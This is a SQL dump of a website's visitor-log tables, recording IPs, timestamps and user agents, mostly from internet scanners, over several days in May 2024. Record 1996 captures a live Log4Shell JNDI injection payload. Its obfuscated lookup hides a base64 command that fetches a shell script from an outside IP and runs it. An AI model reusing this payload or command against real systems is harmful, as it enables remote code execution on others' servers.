INSERT INTO `g5_visit` VALUES ('1972', '162.142.125.14', '2024-05-11', '20:58:32', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1973', '162.216.149.32', '2024-05-11', '21:31:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1974', '110.137.192.198', '2024-05-11', '21:31:17', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1975', '146.190.173.12', '2024-05-11', '22:06:58', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1976', '50.31.21.5', '2024-05-11', '22:49:23', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1977', '179.43.188.106', '2024-05-12', '00:32:45', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1978', '185.224.128.43', '2024-05-12', '00:36:18', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1979', '146.19.24.28', '2024-05-12', '01:09:59', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1980', '46.174.191.31', '2024-05-12', '02:55:59', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1981', '61.0.219.208', '2024-05-12', '03:10:14', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1982', '162.243.132.32', '2024-05-12', '03:40:38', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1983', '198.235.24.10', '2024-05-12', '04:20:35', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1984', '35.203.210.92', '2024-05-12', '04:53:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1985', '168.232.12.247', '2024-05-12', '05:16:16', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1986', '167.94.146.52', '2024-05-12', '05:16:18', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1987', '177.75.222.96', '2024-05-12', '05:21:10', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1988', '104.152.52.197', '2024-05-12', '05:25:38', '', 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1989', '44.220.188.147', '2024-05-12', '05:53:19', '', 'Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/55.0.3098.106 Safari/537.32', '', '', '');
INSERT INTO `g5_visit` VALUES ('1990', '185.191.126.213', '2024-05-12', '06:37:14', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1991', '185.16.38.111', '2024-05-12', '07:17:19', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1992', '185.242.226.10', '2024-05-12', '08:46:59', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1993', '23.249.28.135', '2024-05-12', '08:54:35', '', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1994', '205.210.31.193', '2024-05-12', '08:57:54', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1995', '190.4.26.205', '2024-05-12', '09:39:04', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1996', '92.118.39.120', '2024-05-12', '09:59:37', 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.141.85.179:2411/TomcatBypass/Command/Base64/d2dldCAtTy0gaHR0cDovLzQ1LjE0MS44NS4xNzkvbGkuc2ggfHNoIHx8IGN1cmwgaHR0cDovLzQ1LjE0MS44NS4xNzkvbGkuc2ggfHNo}\')', 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.141.85.179:2411/TomcatBypass/Command/Base64/d2dldCAtTy0gaHR0cDovLzQ1LjE0MS44NS4xNzkvbGkuc2ggfHNoIHx8IGN1cmwgaHR0cDovLzQ1LjE0MS44NS4x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1997', '167.94.138.37', '2024-05-12', '10:22:51', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1998', '61.7.169.136', '2024-05-12', '12:04:37', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1999', '198.235.24.134', '2024-05-12', '12:08:22', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2000', '65.49.1.75', '2024-05-12', '13:59:07', '', 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2001', '167.94.145.104', '2024-05-12', '15:35:12', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2002', '162.216.150.57', '2024-05-12', '16:01:18', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2003', '34.209.239.148', '2024-05-12', '16:55:34', '', 'Mozilla/5.0 (Linux; Android 9; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2004', '106.75.99.41', '2024-05-12', '17:07:01', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2005', '54.226.195.156', '2024-05-12', '18:44:40', '', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2006', '167.248.133.55', '2024-05-12', '19:51:56', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2007', '106.75.92.190', '2024-05-12', '20:10:12', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2008', '34.140.130.61', '2024-05-12', '22:52:15', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2009', '64.23.228.235', '2024-05-13', '00:14:21', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2010', '185.224.128.43', '2024-05-13', '02:36:40', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('2011', '88.212.1.2', '2024-05-13', '02:40:32', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2012', '162.216.150.116', '2024-05-13', '03:11:49', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2013', '35.203.211.58', '2024-05-13', '04:36:23', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2014', '104.199.68.30', '2024-05-13', '05:36:36', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2015', '189.203.90.6', '2024-05-13', '05:46:54', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('2016', '64.23.229.87', '2024-05-13', '08:04:15', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2017', '35.203.210.249', '2024-05-13', '08:15:09', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2018', '61.32.31.241', '2024-05-13', '08:20:15', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2019', '205.210.31.141', '2024-05-13', '09:38:14', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2020', '71.6.232.24', '2024-05-13', '09:39:35', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2021', '164.92.169.200', '2024-05-13', '09:41:20', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2022', '134.122.66.124', '2024-05-13', '09:46:47', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2023', '164.92.231.90', '2024-05-13', '09:53:38', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2024', '138.197.179.180', '2024-05-13', '10:01:34', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2025', '80.65.80.230', '2024-05-13', '10:14:09', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2026', '185.191.126.213', '2024-05-13', '10:19:40', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2027', '54.185.102.60', '2024-05-13', '10:39:16', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2028', '162.216.150.189', '2024-05-13', '12:01:28', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2029', '179.43.188.106', '2024-05-13', '12:12:52', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2030', '167.99.134.178', '2024-05-13', '12:17:05', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2031', '193.106.29.125', '2024-05-13', '13:01:23', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2032', '198.235.24.139', '2024-05-13', '13:38:49', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2033', '193.124.205.37', '2024-05-13', '14:29:08', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2034', '91.92.246.162', '2024-05-13', '15:07:42', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4997.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2035', '45.33.109.18', '2024-05-13', '18:07:04', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('2036', '66.175.213.4', '2024-05-13', '18:07:21', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2037', '71.6.199.23', '2024-05-13', '18:16:19', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2038', '184.105.139.68', '2024-05-13', '20:09:34', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2039', '46.174.191.29', '2024-05-13', '20:44:12', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('2040', '185.242.226.80', '2024-05-13', '20:56:33', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2041', '74.50.64.172', '2024-05-13', '22:13:42', '', 'Linux Gnu (cow)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2042', '179.43.188.106', '2024-05-14', '00:20:32', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2043', '146.90.88.57', '2024-05-14', '00:25:42', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2044', '82.78.49.95', '2024-05-14', '01:01:44', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2045', '35.89.24.181', '2024-05-14', '01:17:43', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2046', '185.191.126.213', '2024-05-14', '02:14:57', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2047', '37.99.69.48', '2024-05-14', '02:45:23', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2048', '87.236.176.239', '2024-05-14', '03:07:52', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2049', '185.224.128.43', '2024-05-14', '03:54:49', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('2050', '198.235.24.55', '2024-05-14', '03:57:49', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2051', '162.216.149.205', '2024-05-14', '04:17:39', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2052', '185.16.38.111', '2024-05-14', '04:55:16', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2053', '185.53.147.130', '2024-05-14', '05:03:11', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('2054', '198.235.24.22', '2024-05-14', '05:30:27', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2055', '198.235.24.144', '2024-05-14', '05:55:41', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2056', '149.50.110.239', '2024-05-14', '06:20:03', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2057', '185.243.187.128', '2024-05-14', '07:31:50', '', 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1', '', '', '');
INSERT INTO `g5_visit` VALUES ('2058', '185.242.226.10', '2024-05-14', '10:29:07', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2059', '34.22.213.78', '2024-05-14', '10:33:28', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2060', '162.142.125.212', '2024-05-14', '14:44:58', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2061', '167.248.133.185', '2024-05-14', '14:45:30', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2062', '167.248.133.123', '2024-05-14', '15:00:22', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2063', '167.248.133.189', '2024-05-14', '15:03:08', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2064', '167.94.138.45', '2024-05-14', '15:11:14', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2065', '162.142.125.9', '2024-05-14', '15:23:46', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2066', '167.248.133.117', '2024-05-14', '15:24:47', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2067', '179.43.188.110', '2024-05-14', '15:46:17', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2068', '167.94.138.47', '2024-05-14', '15:49:16', '', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2069', '162.243.144.4', '2024-05-14', '16:13:28', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('2070', '34.77.99.191', '2024-05-14', '17:47:03', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2071', '216.218.206.69', '2024-05-14', '18:27:21', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2072', '46.174.191.29', '2024-05-14', '19:30:28', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('2073', '198.235.24.117', '2024-05-14', '20:39:16', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2074', '35.203.210.184', '2024-05-14', '21:22:05', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2075', '35.203.210.149', '2024-05-14', '21:55:30', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2076', '47.89.193.239', '2024-05-14', '23:04:45', '', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2077', '162.216.149.226', '2024-05-15', '02:43:01', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2078', '165.22.175.161', '2024-05-15', '03:26:34', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2079', '46.174.191.28', '2024-05-15', '04:29:37', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('2080', '185.224.128.43', '2024-05-15', '05:28:38', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('2081', '179.43.188.110', '2024-05-15', '06:31:51', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2082', '51.254.59.113', '2024-05-15', '06:36:16', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2083', '143.110.152.15', '2024-05-15', '08:04:21', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2084', '139.59.151.228', '2024-05-15', '09:04:06', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2085', '194.26.135.154', '2024-05-15', '09:08:44', '', '\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.124 Safari/537.36\"', '', '', '');
INSERT INTO `g5_visit` VALUES ('2086', '157.230.103.49', '2024-05-15', '09:12:31', '', 'Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2087', '198.235.24.31', '2024-05-15', '09:56:02', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2088', '34.22.213.78', '2024-05-15', '10:35:56', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2089', '54.244.147.71', '2024-05-15', '10:48:54', '', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch)', '', '', '');
INSERT INTO `g5_visit` VALUES ('2090', '51.158.154.254', '2024-05-15', '11:22:37', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2091', '149.50.110.239', '2024-05-15', '11:24:14', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('2092', '222.108.106.171', '2024-05-15', '11:26:27', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('2093', '61.32.31.241', '2024-05-16', '12:50:37', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Whale/3.25.232.19 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2094', '185.180.143.71', '2024-05-16', '13:48:14', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2095', '162.216.150.127', '2024-05-16', '14:14:37', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2096', '198.235.24.135', '2024-05-16', '14:35:47', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('2097', '159.203.11.92', '2024-05-16', '14:36:50', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2098', '121.190.219.223', '2024-05-21', '23:51:00', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('2099', '212.71.255.83', '2024-05-24', '21:50:43', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0', '', '', '');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-25', '1');
INSERT INTO `g5_visit_sum` VALUES ('2023-04-29', '1');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-21', '1');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-24', '1');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-01', '2');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-21', '2');
INSERT INTO `g5_visit_sum` VALUES ('2022-03-01', '3');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-21', '4');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-02', '4');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-07', '4');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-08', '4');
INSERT INTO `g5_visit_sum` VALUES ('2023-04-25', '4');
INSERT INTO `g5_visit_sum` VALUES ('2024-01-20', '4');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-15', '5');
INSERT INTO `g5_visit_sum` VALUES ('2023-04-30', '5');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-16', '5');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-22', '8');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-10', '8');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-18', '9');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-04', '10');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-05', '10');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-14', '10');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-20', '11');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-26', '12');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-06', '13');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-11', '14');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-30', '15');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-03', '16');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-20', '16');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-01', '16');
INSERT INTO `g5_visit_sum` VALUES ('2024-05-15', '16');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-27', '17');
INSERT INTO `g5_visit_sum` VALUES ('2022-09-22', '17');
INSERT INTO `g5_visit_sum` VALUES ('2022-08-28', '18');
